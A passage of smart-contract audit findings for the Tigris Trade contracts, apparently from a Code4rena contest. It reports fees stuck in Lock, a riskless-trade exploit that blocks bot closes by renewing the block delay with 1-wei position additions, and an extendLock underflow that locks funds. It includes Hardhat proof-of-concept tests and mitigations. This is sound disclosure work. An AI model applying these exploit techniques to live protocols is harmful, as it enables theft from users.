await stabletoken.balanceOf(user.address)       const tenPow18 = "1000000000000000000"       console.log(`StableToken balance at end: ${(amount / tenPow18).toString()}`)     }) }) ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215   # Vulnerability details  ## Impact When calling `Lock.claimGovFees` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110)), assets that are set to be not allowed or assets that don't have any shares yet in the `BondNFT` contract will cause a silent failure in `BondNFT.distribute` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215)).   The funds from the `GovNFT` contract will get transferred into the `Lock` contract and then will be stuck there. They cannot be recovered.    ## Proof of Concept 1. An asset is added to the `BondNFT` contract by calling `BondNFT.addAsset` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349)) 2. There are no bonds yet for this asset so the amount of shares for the asset is zero 3. `Lock.claimGovFees` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110)) is called 4. Funds are transferred from the `GovNFT` contract to the `Lock` contract ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115)) 5. The call to `BondNFT.distribute` now fails quietly without reverting the transaction:      ```solidity     if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;    ``` 6. The funds are now stuck in the `Lock` contract. They cannot be recovered.  ## Tools Used VSCode  ## Recommended Mitigation Steps A naive solution would be to use `revert` instead of `return` in `BondNFT.distribute` such that funds are either transferred from `GovNFT` to `Lock` and then to `BondNFT` or not at all.    ```solidity      ) external { -        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return; +        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) revert;          IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);          unchecked {              uint aEpoch = block.timestamp / DAY; ```  This however is an incomplete fix because if there is a single "bad" asset, rewards for the other assets cannot be distributed either.    Moreover functions like `Lock.lock` and `Lock.release` rely on `Lock.claimGovFees` to not revert.    So you might allow the owner to rescue stuck tokens from the `Lock` contract. Of course only allow rescuing the balance of the `Lock` contract minus the `totalLocked` of the asset in the `Lock` contract such that the locked amount cannot be rescued.  
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L573   # Vulnerability details  # Riskless trades due to delay check  ### Summary `Trading.limitClose()` uses `_checkDelay()`. This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.   ### Detailed description A malicious trader can exploit the `Trading` contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.  The exploit is based on three principles: 1. The stop-loss of a position can be updated without any delay checks, due to `_checkDelay()` not being called in `updateTpSl()` 2. Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to `limitClose` calling `_checkDelay()` 3. The block delay can be continuously renewed for a negligible cost  **Based on these three principles, the following method can be used to perform riskless trades:** Assuming a current market price of 1,000 DAI, begin by opening a long limit order through `initiateLimitOrder()` at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through `executeLimitOrder`.  After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call `limitClose`. However, we can prevent them from doing so by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out *[1]*, which will renew the delay and thus stops `limitClose` from being called.  While the trader keeps renewing the delay to stop his position from being closed, he watches the price development: - If the price goes **down**, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through `liquidatePosition()`. If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again. - If the price goes **up**, the trader calls `updateTpSl()` to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls `updateTpSl()` with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to `_checkDelay()`.  The trader keeps calling `updateTpSl()` when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls `limitClose()` to close the order at the peak stop-loss.   *Notes* *[1]*: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to `addToPosition` after every few transactions on the chain. However, `block.number`, which is used by the contract, actually returns the L1 block number and not the L2 block number.  ### Recommended mitigation The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in `limitClose()` should be modified to also consider whether the position is below the stop-loss.    ### PoC Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`: ```javascript describe("PoC", function () {     it.only("PoC", async function () {       // Setup token balances and approvals       const mockDAI = await ethers.getContractAt("MockERC20", MockDAI.address)       await mockDAI.connect(owner).transfer(user.address, parseEther("10000"))       await mockDAI.connect(owner).transfer(stablevault.address, parseEther("100000"))       await mockDAI.connect(user).approve(trading.address, parseEther("10000"))       const daiAtBeginning = await mockDAI.balanceOf(user.address)       const permitData = [         "0",         "0",         "0",         "0x0000000000000000000000000000000000000000000000000000000000000000",         "0x0000000000000000000000000000000000000000000000000000000000000000",         false       ]        // Setup block delay to 5 blocks       const blockDelay = 5;       await trading.connect(owner).setBlockDelay(blockDelay)           // ============================================================== //       // =================== Create the limit order =================== //       // ============================================================== //       const tradeInfo = [         parseEther("9000"),       // margin amount         MockDAI.address,          // margin asset         StableVault.address,      // stable vault         parseEther("2"),          // leverage         0,                        // asset id         true,                     // direction (long)         parseEther("0"),          // take profit price         parseEther("1000"),       // stop loss price         ethers.constants.HashZero // referral       ];        // Create the order       await trading.connect(user).initiateLimitOrder(         tradeInfo,            // trade info         1,                    // order type (limit)         parseEther("1000"),   // price         permitData,           // permit         user.address          // trader       )          // ============================================================== //       // =================== Execute the limit order ================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send("evm_increaseTime", [10])       for (let n = 0; n < blockDelay; n++) {         await network.provider.send("evm_mine")       }        // Create the price data (the price hasn't changed)       let priceData = [         node.address,                                   // provider         0,                                              // asset id         parseEther("1000"),                             // price         10000000,                                       // spread (0.1%)         (await ethers.provider.getBlock()).timestamp,   // timestamp         false                                           // is closed       ]        // Sign the price data       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       )        // Execute the limit order       await trading.connect(user).executeLimitOrder(1, priceData, sig);             // ============================================================== //       // ================== Block bots from closing =================== //       // ============================================================== //        for (let i = 0; i < 5; i++) {          /*           This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.           We constantly add 1 wei to the position when the delay is close to running out.           This won't change anything about our position, but it will reset the delay timer,           stopping bots from calling `limitClose()`.             This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.           And if the price rises, we can push the stop loss higher to keep profits.            The loop runs five times just to demonstrate. In reality, this could be done as long as needed.         */           // Blocks advanced to one block before the delay would pass         await network.provider.send("evm_increaseTime", [10])         for (let n = 0; n < blockDelay - 1; n++) {           await network.provider.send("evm_mine")         }             // ============================================================== //         // =========== Add 1 wei to position (price is down)  =========== //         // ============================================================== //          // Increase delay by calling addToPosition with 1 wei         // Create the price data         priceData = [           node.address,                                   // provider           0,                                              // asset id           parseEther("900"),                              // price           10000000,                                       // spread (0.1%)           (await ethers.provider.getBlock()).timestamp,   // timestamp           false                                           // is closed         ]          // Sign the price data -          message = ethers.utils.keccak256(           ethers.utils.defaultAbiCoder.encode(             ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],             [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]           )         );         sig = await node.signMessage(           Buffer.from(message.substring(2), 'hex')         )          // Add to position         await trading.connect(user).addToPosition(           1,           "1",           priceData,           sig,           stablevault.address,           MockDAI.address,           permitData,           user.address,         )            // ============================================================== //         // ====================== Bots cannot close ===================== //         // ============================================================== //          // Bots cannot close the position even if the price is down below the stop loss         await expect(trading.connect(user).limitClose(           1,          // id           false,      // take profit           priceData,  // price data           sig,        // signature         )).to.be.revertedWith("0") // checkDelay          // They can also not liquidate the position because the price is not down enough         // If the price falls close to the liquidation zone, we can add more margin or simply close         // the position, netting us the stop-loss price.         await expect(trading.connect(user).liquidatePosition(           1,          // id           priceData,  // price data           sig,        // signature         )).to.be.reverted             // ============================================================== //         // =============== Increase SL when price is up  ================ //         // ============================================================== //          // Sign the price data (price has 5x'ed from initial price)         priceData = [           node.address,                                   // provider           0,                                              // asset id           parseEther("5000"),                             // price           10000000,                                       // spread (0.1%)           (await ethers.provider.getBlock()).timestamp,   // timestamp           false                                           // is closed         ]         message = ethers.utils.keccak256(           ethers.utils.defaultAbiCoder.encode(             ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],             [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]           )         );         sig = await node.signMessage(           Buffer.from(message.substring(2), 'hex')         )          // Update stop loss right at the current price         await trading.connect(user).updateTpSl(           false,                // type (sl)           1,                    // id           parseEther("5000"),   // sl price           priceData,            // price data           sig,                  // signature           user.address,        // trader         )       }            // ============================================================== //       // ======================== Close order  ======================== //       // ============================================================== //        // When we are happy with the profit, we stop increasing the delay and close the position        // Wait for some blocks to pass the delay       await network.provider.send("evm_increaseTime", [10])       for (let n = 0; n < blockDelay; n++) {         await network.provider.send("evm_mine")       }        // Close order       await trading.connect(user).limitClose(         1,          // id         false,      // take profit         priceData,  // price data         sig,        // signature       )        // Withdraw to DAI       const amount = await stabletoken.balanceOf(user.address)       await stablevault.connect(user).withdraw(MockDAI.address, amount)        // Print results       const daiAtEnd = await mockDAI.balanceOf(user.address)       const tenPow18 = "1000000000000000000"       const diff = (daiAtEnd - daiAtBeginning).toString() / tenPow18       console.log(`Profit: ${diff} DAI`)     }) }) ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105   # Vulnerability details  ## Impact The `Lock` contract ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10)) allows end-users to interact with bonds.    There are two functions that allow to lock some amount of assets. The first function is `Lock.lock` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76)) which creates a new bond. The second function is `Lock.extendLock` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92)). This function extends the lock for some `_period` and / or increases the locked amount by some `_amount`.    The issue is that the `Lock.extendLock` function does not increase the value in `totalLocked[_asset]`. This however is necessary because `totalLocked[_asset]` is reduced when `Lock.release` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105)) is called.    Therefore only the amount of assets deposited via `Lock.lock` can be released again. The amount of assets deposited using `Lock.extendLock` can never be released again because reducing `totalLocked[_asset]` will cause a revert due to underflow.    So the amount of assets deposited using `Lock.extendLock` is lost.    ## Proof of Concept 1. User A calls `Lock.lock` to lock a certain `_amount` (amount1) of `_asset` for a certain `_period`. 2. User A calls then `Lock.extendLock` and increases the locked amount of the bond by some amount2 3. User A waits until the bond has expired 4. User A calls `Lock.release`. This function calculates `totalLocked[asset] -= lockAmount;`. Which will cause a revert because the value of `totalLocked[asset]` is only amount1  You can add the following test to the `Bonds` test in `Bonds.js`:   ```javascript describe("ReleaseUnderflow", function () {     it("release can cause underflow", async function () {         await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther("110"));         // Lock 100 for 9 days         await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther("100"), 9);          await bond.connect(owner).setManager(lock.address);          await stabletoken.connect(user).approve(lock.address, ethers.utils.parseEther("10"));          // Lock another 10         await lock.connect(user).extendLock(1, ethers.utils.parseEther("10"), 0);          await network.provider.send("evm_increaseTime", [864000]); // Skip 10 days         await network.provider.send("evm_mine");          // Try to release 110 after bond has expired -> Underflow         await lock.connect(user).release(1);     }); }); ``` Run it with `npx hardhat test --grep "release can cause underflow"`.   You can see that it fails because it causes an underflow.    ## Tools Used VSCode  ## Recommended Mitigation Steps Add `totalLocked[_asset] += amount` to the `Lock.extendLock` function.  
